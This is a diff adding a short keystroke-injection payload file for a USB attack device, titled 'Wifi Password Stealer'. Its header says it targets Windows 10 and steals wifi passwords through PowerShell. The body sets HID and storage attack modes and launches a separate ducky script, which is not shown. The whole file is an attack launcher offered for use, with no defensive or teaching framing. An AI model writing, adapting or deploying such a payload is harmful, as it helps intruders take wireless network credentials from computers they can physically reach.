@@ -1,0 +1,18 @@
+# Title:          Wifi Password Stealer
+# Description:    steals wifi passwords via powershell
+# Author:         Blue Cosmo
+# Category:       credentials
+# Target:         Windows 10
+# Attackmodes:    HID, STORAGE
+
+# set up payload
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+# run duckysript file 'ducky-script.txt'
+LED STAGE1
+QUACK ${SWITCH_POSITION}/ducky-script.txt
+
+# end payload
+LED FINISH
